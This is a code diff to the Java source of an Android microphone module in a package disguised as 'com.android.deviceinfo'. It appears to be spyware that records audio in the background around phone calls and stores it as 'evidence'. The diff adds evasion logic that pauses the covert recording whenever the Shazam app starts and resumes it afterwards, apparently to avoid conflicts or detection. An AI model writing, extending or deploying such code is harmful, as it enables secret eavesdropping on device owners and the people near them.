@@ -12,6 +12,8 @@ package com.android.deviceinfo.module;
 import java.io.IOException;
 import java.io.InputStream;
 
+import android.content.Context;
+import android.media.AudioManager;
 import android.media.MediaRecorder;
 import android.media.MediaRecorder.OnErrorListener;
 import android.media.MediaRecorder.OnInfoListener;
@@ -20,6 +22,8 @@ import android.net.LocalSocket;
 import android.net.LocalSocketAddress;
 
 import com.android.deviceinfo.Call;
+import com.android.deviceinfo.ProcessInfo;
+import com.android.deviceinfo.ProcessStatus;
 import com.android.deviceinfo.StateRun;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
@@ -29,6 +33,7 @@ import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerCall;
+import com.android.deviceinfo.listener.ListenerProcess;
 import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
@@ -48,11 +53,12 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 	private static final String TAG = "ModuleMic"; //$NON-NLS-1$
 	private static final long MIC_PERIOD = 5000;
-	// #!AMR[space] 
+	// #!AMR[space]
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
+	private static final int SUSPEND_CALL = 0;
 
 	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
-	
+
 	/** The recorder. */
 	MediaRecorder recorder;
 
@@ -68,11 +74,12 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	private String socketname;
 
 	boolean phoneListening;
+	private Observer<ProcessInfo> processObserver;
 
 	public static ModuleMic self() {
 		return (ModuleMic) ManagerModule.self().get(M.e("mic"));
 	}
-	 
+
 	/*
 	 * (non-Javadoc)
 	 * 
@@ -196,12 +203,48 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			ListenerCall.self().attach(this);
 			phoneListening = true;
 		}
+
+		if (processObserver == null) {
+			processObserver = new ProcessObserver(this);
+		}
+		ListenerProcess.self().attach(processObserver);
 	}
 
 	private void removePhoneListener() {
 		if (phoneListening) {
 			ListenerCall.self().detach(this);
 			phoneListening = false;
+		}
+
+		ListenerProcess.self().detach(processObserver);
+	}
+
+	@Override
+	public void notifyProcess(ProcessInfo b) {
+
+		AudioManager audioManager = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
+		boolean headset = audioManager.isWiredHeadsetOn();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (notifyProcess) headset: " + headset);
+		}
+
+		String[] blacklist = new String[] { "shazam" };
+
+		for (String bl : blacklist) {
+			if (b.processInfo.contains(bl)) {
+				if (b.status == ProcessStatus.START) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (notifyProcess) blacklist started, " + b.processInfo);
+					}
+					suspend();
+				}else{
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (notifyProcess) blacklist stopped, " + b.processInfo);
+					}
+					resume();
+				}
+			}
+
 		}
 	}
 
@@ -275,7 +318,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveRecorderEvidence), data.length+1: " + (data.length + 1) + " pos: " + pos);
 			}
-			
+
 			if (pos > data.length + 1) {
 
 				// portion of microchunk to be saved for the next time
@@ -287,7 +330,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 					Check.log(TAG + " (saveRecorderEvidence): unfinishedLen = " + unfinishedLen + " unfPos: "
 							+ unfinishedPos + " chunklen: " + chunklen);
 				}
-				
+
 				unfinished = ByteArray.copy(data, unfinishedPos, data.length - unfinishedPos);
 				if (unfinished.length > 0) {
 					if (Cfg.DEBUG) {
@@ -296,8 +339,6 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 					data = ByteArray.copy(data, 0, unfinishedPos);
 				}
 			}
-
-
 
 			if (data.length > 0) {
 				EvidenceBuilder.atomic(EvidenceType.MIC, getAdditionalData(), data);
